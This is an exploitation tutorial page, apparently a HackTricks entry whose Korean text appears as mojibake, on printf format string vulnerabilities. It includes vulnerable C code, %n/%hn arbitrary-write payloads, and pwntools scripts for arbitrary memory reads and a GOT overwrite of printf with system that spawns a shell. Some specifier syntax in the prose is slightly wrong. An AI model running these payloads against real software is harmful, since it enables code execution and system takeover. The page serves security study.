# í¬ë§· ë¬¸ìì—´

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”**!</summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ **í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? í˜¹ì€ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”, ì €í¬ì˜ ë…ì  [**NFT ì»¬ë ‰ì…˜**](https://opensea.io/collection/the-peass-family)
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™¹**](https://peass.creator-spring.com)ì„ ë°›ì•„ë³´ì„¸ìš”
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì´ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°**ì—ì„œ ì €ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ í•˜ê³  ì‹¶ìœ¼ì‹œë‹¤ë©´** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ë°** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ë¡œ PRì„ ì œì¶œí•˜ì„¸ìš”**.

</details>

## ê¸°ë³¸ ì •ë³´

C ì–¸ì–´ì—ì„œ **`printf`**ëŠ” **ë¬¸ìì—´ì„ ì¶œë ¥í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” í•¨ìˆ˜**ì…ë‹ˆë‹¤. ì´ í•¨ìˆ˜ê°€ ê¸°ëŒ€í•˜ëŠ” **ì²« ë²ˆì§¸ ë§¤ê°œë³€ìˆ˜**ëŠ” **í¬ë§¤í„°ê°€ ìˆëŠ” ì›ì‹œ í…ìŠ¤íŠ¸**ì…ë‹ˆë‹¤. ê¸°ëŒ€ë˜ëŠ” **ë‹¤ìŒ ë§¤ê°œë³€ìˆ˜**ëŠ” ì›ì‹œ í…ìŠ¤íŠ¸ì—ì„œ **í¬ë§¤í„°ë¥¼ ëŒ€ì²´í•  ê°’**ì…ë‹ˆë‹¤.

ì·¨ì•½ì ì€ **ê³µê²©ì í…ìŠ¤íŠ¸ê°€ ì´ í•¨ìˆ˜ì˜ ì²« ë²ˆì§¸ ì¸ìˆ˜ë¡œ ì‚¬ìš©ë  ë•Œ** ë°œìƒí•©ë‹ˆë‹¤. ê³µê²©ìëŠ” **printf í¬ë§· ë¬¸ìì—´ ê¸°ëŠ¥ì„ ì•…ìš©í•˜ì—¬ íŠ¹ìˆ˜ ì…ë ¥ì„ ì¡°ì‘**í•˜ì—¬ **ëª¨ë“  ì£¼ì†Œì˜ ë°ì´í„°ë¥¼ ì½ê³  ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì½ê¸°/ì“°ê¸° ê°€ëŠ¥)**. ì´ë ‡ê²Œ í•¨ìœ¼ë¡œì¨ **ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### í¬ë§¤í„°:
```bash
%08x â€”> 8 hex bytes
%d â€”> Entire
%u â€”> Unsigned
%s â€”> String
%n â€”> Number of written bytes
%hn â€”> Occupies 2 bytes instead of 4
<n>$X â€”> Direct access, Example: ("%3$d", var1, var2, var3) â€”> Access to var3
```
**ì˜ˆì‹œ:**

* ì·¨ì•½í•œ ì˜ˆì œ:
```c
char buffer[30];
gets(buffer);  // Dangerous: takes user input without restrictions.
printf(buffer);  // If buffer contains "%x", it reads from the stack.
```
* ì¼ë°˜ì ì¸ ì‚¬ìš©:
```c
int value = 1205;
printf("%x %x %x", value, value, value);  // Outputs: 4b5 4b5 4b5
```
* ëˆ„ë½ëœ ì¸ìˆ˜ê°€ ìˆëŠ” ê²½ìš°:
```c
printf("%x %x %x", value);  // Unexpected output: reads random values from the stack.
```
### **í¬ì¸í„° ì ‘ê·¼**

í˜•ì‹ **`%<n>$x`**, ì—¬ê¸°ì„œ `n`ì€ ìˆ«ìë¡œ, printfì—ê²Œ në²ˆì§¸ ë§¤ê°œë³€ìˆ˜(ìŠ¤íƒì—ì„œ)ë¥¼ ì„ íƒí•˜ë„ë¡ ì§€ì‹œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ printfë¥¼ ì‚¬ìš©í•˜ì—¬ ìŠ¤íƒì—ì„œ 4ë²ˆì§¸ ë§¤ê°œë³€ìˆ˜ë¥¼ ì½ê³  ì‹¶ë‹¤ë©´ ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```c
printf("%x %x %x %x")
```
ê·¸ë¦¬ê³  ì²« ë²ˆì§¸ë¶€í„° ë„¤ ë²ˆì§¸ ë§¤ê°œë³€ìˆ˜ê¹Œì§€ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜ëŠ” ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```c
printf("$4%x")
```
ê·¸ë¦¬ê³  ì§ì ‘ ë„¤ ë²ˆì§¸ë¥¼ ì½ìœ¼ì‹­ì‹œì˜¤.

ê³µê²©ìê°€ `pr`**`intf` ë§¤ê°œë³€ìˆ˜ë¥¼ ì œì–´í•œë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì‹­ì‹œì˜¤.** ì´ëŠ” ê³µê²©ìì˜ ì…ë ¥ì´ `printf`ê°€ í˜¸ì¶œë  ë•Œ ìŠ¤íƒì— ìˆì„ ê²ƒì„ ì˜ë¯¸í•˜ë©°, ì´ëŠ” ê³µê²©ìê°€ ìŠ¤íƒì— íŠ¹ì • ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ ì“¸ ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

{% hint style="danger" %}
ì´ ì…ë ¥ì„ ì œì–´í•˜ëŠ” ê³µê²©ìëŠ” **ì„ì˜ì˜ ì£¼ì†Œë¥¼ ìŠ¤íƒì— ì¶”ê°€í•˜ê³  `printf`ê°€ ê·¸ ì£¼ì†Œì— ì•¡ì„¸ìŠ¤í•˜ë„ë¡** ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ì„¹ì…˜ì—ì„œ ì´ ë™ì‘ì„ ì‚¬ìš©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•´ ì„¤ëª…ë  ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

## **ì„ì˜ì˜ ì½ê¸°**

í¬ë§·í„° **`$n%s`**ë¥¼ ì‚¬ìš©í•˜ì—¬ **`printf`**ê°€ **n ìœ„ì¹˜**ì— ìˆëŠ” **ì£¼ì†Œ**ë¥¼ ê°€ì ¸ì™€ ê·¸ ë’¤ë¥¼ ë”°ë¼ê°€ì„œ **ë¬¸ìì—´ì²˜ëŸ¼ ì¶œë ¥**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(0x00ì´ ë°œê²¬ë  ë•Œê¹Œì§€ ì¶œë ¥). ë”°ë¼ì„œ ì´ì§„ íŒŒì¼ì˜ ê¸°ë³¸ ì£¼ì†Œê°€ **`0x8048000`**ì´ê³ , ì‚¬ìš©ì ì…ë ¥ì´ ìŠ¤íƒì˜ 4ë²ˆì§¸ ìœ„ì¹˜ì—ì„œ ì‹œì‘í•œë‹¤ëŠ” ê²ƒì„ ì•Œê³  ìˆë‹¤ë©´, ì´ì§„ íŒŒì¼ì˜ ì‹œì‘ ë¶€ë¶„ì„ ë‹¤ìŒê³¼ ê°™ì´ ì¶œë ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
from pwn import *

p = process('./bin')

payload = b'%6$p' #4th param
payload += b'xxxx' #5th param (needed to fill 8bytes with the initial input)
payload += p32(0x8048000) #6th param

p.sendline(payload)
log.info(p.clean()) # b'\x7fELF\x01\x01\x01||||'
```
{% hint style="danger" %}
ì£¼ì†Œ 0x8048000ì„ ì…ë ¥ì˜ ì‹œì‘ ë¶€ë¶„ì— ë„£ì„ ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ì™œëƒí•˜ë©´ í•´ë‹¹ ì£¼ì†Œì˜ ëì— 0x00ì´ ì—°ê²°ë  ê²ƒì…ë‹ˆë‹¤.
{% endhint %}

## **ì„ì˜ ì“°ê¸°**

í¬ë§·í„° **`$<num>%n`**ì€ ìŠ¤íƒì˜ \<num> ë§¤ê°œë³€ìˆ˜ì— ì“°ì—¬ì§„ ë°”ì´íŠ¸ ìˆ˜ë¥¼ ì§€ì •ëœ ì£¼ì†Œì— ì”ë‹ˆë‹¤. ê³µê²©ìê°€ printfë¥¼ ì‚¬ìš©í•˜ì—¬ ì›í•˜ëŠ” ë§Œí¼ ë¬¸ìë¥¼ ì“¸ ìˆ˜ ìˆë‹¤ë©´, **`$<num>%n`**ì„ ì‚¬ìš©í•˜ì—¬ ì„ì˜ì˜ ìˆ«ìë¥¼ ì„ì˜ì˜ ì£¼ì†Œì— ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‹¤í–‰íˆë„, ìˆ«ì 9999ë¥¼ ì“°ê¸° ìœ„í•´ì„œëŠ” ì…ë ¥ì— 9999ê°œì˜ "A"ë¥¼ ì¶”ê°€í•  í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤. ëŒ€ì‹ , **`%.<num-write>%<num>$n`** í¬ë§·í„°ë¥¼ ì‚¬ìš©í•˜ì—¬ **`<num-write>`** ìˆ«ìë¥¼ **`num` ìœ„ì¹˜ê°€ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œ**ì— ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
AAAA%.6000d%4\$n â€”> Write 6004 in the address indicated by the 4Âº param
AAAA.%500\$08x â€”> Param at offset 500
```
ê·¸ëŸ¬ë‚˜ ì¼ë°˜ì ìœ¼ë¡œ `0x08049724`ì™€ ê°™ì€ ì£¼ì†Œë¥¼ ì‘ì„±í•˜ê¸° ìœ„í•´ì„œëŠ” (ì´ëŠ” í•œ ë²ˆì— ì‘ì„±í•˜ê¸°ì—ëŠ” ë§¤ìš° í° ìˆ«ìì…ë‹ˆë‹¤), `$n` ëŒ€ì‹ ì— **`$hn`**ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ **2ë°”ì´íŠ¸ë§Œ ì‘ì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì´ ì‘ì—…ì€ ì£¼ì†Œì˜ ìµœìƒìœ„ 2ë°”ì´íŠ¸ì™€ ìµœí•˜ìœ„ ë°”ì´íŠ¸ë¥¼ ê°ê° ë‘ ë²ˆ ìˆ˜í–‰í•©ë‹ˆë‹¤.

ë”°ë¼ì„œ ì´ ì·¨ì•½ì ì„ í†µí•´ **ì„ì˜ì˜ ì£¼ì†Œì— ì–´ë–¤ ê²ƒì´ë“  ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì„ì˜ ì“°ê¸°).**

ì´ ì˜ˆì—ì„œ ëª©í‘œëŠ” ë‚˜ì¤‘ì— í˜¸ì¶œë  **GOT** í…Œì´ë¸”ì˜ **í•¨ìˆ˜**ì˜ **ì£¼ì†Œ**ë¥¼ **ë®ì–´ì“°ëŠ” ê²ƒ**ì…ë‹ˆë‹¤. ì´ëŠ” ë‹¤ë¥¸ ì„ì˜ ì“°ê¸°ë¥¼ ì‹¤í–‰í•˜ëŠ” ê¸°ìˆ ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../arbitrary-write-2-exec/" %}
[arbitrary-write-2-exec](../arbitrary-write-2-exec/)
{% endcontent-ref %}

**ì‚¬ìš©ì**ë¡œë¶€í„° **ì¸ìˆ˜**ë¥¼ **ë°›ëŠ” í•¨ìˆ˜**ì˜ **ì£¼ì†Œ**ë¥¼ **`system`** **í•¨ìˆ˜**ë¡œ **ì§€ì •**í•˜ë ¤ê³  í•©ë‹ˆë‹¤.\
ì–¸ê¸‰í•œëŒ€ë¡œ ì£¼ì†Œë¥¼ ì‘ì„±í•˜ë ¤ë©´ ì¼ë°˜ì ìœ¼ë¡œ 2ë‹¨ê³„ê°€ í•„ìš”í•©ë‹ˆë‹¤: ë¨¼ì € ì£¼ì†Œì˜ 2ë°”ì´íŠ¸ë¥¼ ì‘ì„±í•œ ë‹¤ìŒ ë‚˜ë¨¸ì§€ 2ë°”ì´íŠ¸ë¥¼ ì‘ì„±í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ **`$hn`**ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.

* **HOB**ëŠ” ì£¼ì†Œì˜ ìƒìœ„ 2ë°”ì´íŠ¸ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.
* **LOB**ëŠ” ì£¼ì†Œì˜ í•˜ìœ„ 2ë°”ì´íŠ¸ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

ê·¸ëŸ° ë‹¤ìŒ, í˜•ì‹ ë¬¸ìì—´ì´ ì‘ë™í•˜ëŠ” ë°©ì‹ ë•Œë¬¸ì— ë¨¼ì € \[HOB, LOB\] ì¤‘ **ë” ì‘ì€ ê°’ì„ ì‘ì„±**í•œ ë‹¤ìŒ ë‹¤ë¥¸ ê°’ì„ ì‘ì„±í•´ì•¼ í•©ë‹ˆë‹¤.

ë§Œì•½ HOB < LOBì´ë©´\
`[ì£¼ì†Œ+2][ì£¼ì†Œ]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

ë§Œì•½ HOB > LOBì´ë©´\
`[ì£¼ì†Œ+2][ì£¼ì†Œ]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NÂºParam\_dir\_HOB LOB\_shell-HOB\_shell NÂºParam\_dir\_LOB

{% code overflow="wrap" %}
```bash
python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'
```
{% endcode %}

### Pwntools í…œí”Œë¦¿

ì´ëŸ¬í•œ ì·¨ì•½ì ì„ ì´ìš©í•œ exploitì„ ì¤€ë¹„í•˜ê¸° ìœ„í•œ **í…œí”Œë¦¿**ì„ ë‹¤ìŒì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

ë˜ëŠ” [**ì—¬ê¸°**](https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite/exploiting-a-got-overwrite)ì—ì„œ ì œê³µí•˜ëŠ” ê¸°ë³¸ ì˜ˆì œë¥¼ ì°¸ê³ í•˜ì„¸ìš”:
```python
from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc
libc.address = 0xf7dc2000       # ASLR disabled

p = process()

payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

p.clean()

p.sendline('/bin/sh')

p.interactive()
```
## Format Strings to BOF

ì„œì‹ ë¬¸ìì—´ ì·¨ì•½ì ì˜ ì“°ê¸° ë™ì‘ì„ ì•…ìš©í•˜ì—¬ **ìŠ¤íƒì˜ ì£¼ì†Œì— ì“°ê¸°**í•˜ê³  **ë²„í¼ ì˜¤ë²„í”Œë¡œìš°** ìœ í˜•ì˜ ì·¨ì•½ì ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ë‹¤ë¥¸ ì˜ˆì œ ë° ì°¸ê³  ìë£Œ

* [https://ir0nstone.gitbook.io/notes/types/stack/format-string](https://ir0nstone.gitbook.io/notes/types/stack/format-string)
* [https://www.youtube.com/watch?v=t1LH9D5cuK4](https://www.youtube.com/watch?v=t1LH9D5cuK4)
* [https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html)
* 32ë¹„íŠ¸, relro ì—†ìŒ, ìºë„ˆë¦¬ ì—†ìŒ, nx, pie ì—†ìŒ, ìŠ¤íƒì—ì„œ í”Œë˜ê·¸ ìœ ì¶œí•˜ê¸° ìœ„í•œ ê¸°ë³¸ì ì¸ ì„œì‹ ë¬¸ìì—´ ì‚¬ìš© (ì‹¤í–‰ íë¦„ ë³€ê²½ í•„ìš” ì—†ìŒ)
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32ë¹„íŠ¸, relro, ìºë„ˆë¦¬ ì—†ìŒ, nx, pie ì—†ìŒ, `fflush` ì£¼ì†Œë¥¼ `win` í•¨ìˆ˜ë¡œ ë®ì–´ì“°ê¸° ìœ„í•œ ì„œì‹ ë¬¸ìì—´ ì‚¬ìš© (ret2win)
* [https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html)
* 32ë¹„íŠ¸, relro, ìºë„ˆë¦¬ ì—†ìŒ, nx, pie ì—†ìŒ, `.fini_array` ë‚´ë¶€ì˜ main ì£¼ì†Œì— ì£¼ì†Œë¥¼ ì“°ê¸° ìœ„í•œ ì„œì‹ ë¬¸ìì—´ ì‚¬ìš© (íë¦„ì´ 1ë²ˆ ë” ë£¨í”„ë˜ë„ë¡) ë° `system` ì£¼ì†Œë¥¼ `strlen`ì„ ê°€ë¦¬í‚¤ëŠ” GOT í…Œì´ë¸”ì— ì“°ê¸°. íë¦„ì´ mainìœ¼ë¡œ ëŒì•„ê°€ë©´ ì‚¬ìš©ì ì…ë ¥ê³¼ í•¨ê»˜ `strlen`ì´ ì‹¤í–‰ë˜ê³  `system`ì„ ê°€ë¦¬í‚¤ë¯€ë¡œ ì „ë‹¬ëœ ëª…ë ¹ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.
